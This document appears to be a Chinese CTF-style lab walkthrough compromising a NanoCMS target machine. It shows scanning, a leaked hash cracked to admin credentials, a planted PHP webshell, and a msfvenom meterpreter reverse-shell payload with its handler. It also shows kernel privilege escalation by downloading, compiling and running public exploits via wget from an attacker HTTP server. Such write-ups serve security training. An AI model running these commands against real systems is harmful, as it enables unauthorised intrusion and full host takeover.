过程


1.信息收集


靶机IP地址确认

nmap -Pn 192.168.40.0/24



访问80端口网页


blog页面


searchsploit 查找nanocms相关漏洞，没有收获。

谷歌一下相关漏洞，发现有一个hash泄露的漏洞。


访问http://192.168.40.156/~andy/data/pagesdata.txt



somd5解密



获得后台登录账户密码

账号：admin

密码：shannon


登录后台


页面尝试添加phpinfo看是否解析



解析成功



2.getshell


页面加入一句话木马



菜刀连接



连接成功



msfvenom生成一个payload通过菜刀上传到网站目录，访问payload反弹到msf。


msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.40.154 LPORT=8998 -f raw > shell.php


msfconsole


msfconsoleuse exploit/multi/handlerset payload php/meterpreter_reverse_tcpset LHOST 192.168.40.154set LPORT 8998run


监听后访问payload


3.提权


uname -a 查看内核版本



searchsploit 2.6.23



脚本复制到当前目录


searchsploit -m 5093


谷歌搜索相关利用文章


提权失败



继续尝试，尝试9479内核提权。



exp编译


searchsploit -m 9479.c

gcc -m32 9479.c -o exp


起一个http服务，文件下载到靶机/tmp目录，给执行权限，执行利用成功。


python -m SimpleHTTPServer 8099


靶机wget exp文件

cd /tmpwget http://192.168.40.164:8099/expchmod a+x exp./exp


4.总结&踩坑


第一次编译内核提权exp


编译exp的时候编译失败，谷歌搜索了解到要加-m32参数。



加上-m32参数成功解决，再次编译还是报错。



因为gcc 32头文件缺失，编译报错。

解决办法：放到kali 32位系统重新编译，编译正常。


编译9479 exp，报错后exp正常输出，提权利用也正常。



提权时，没有出现问题。
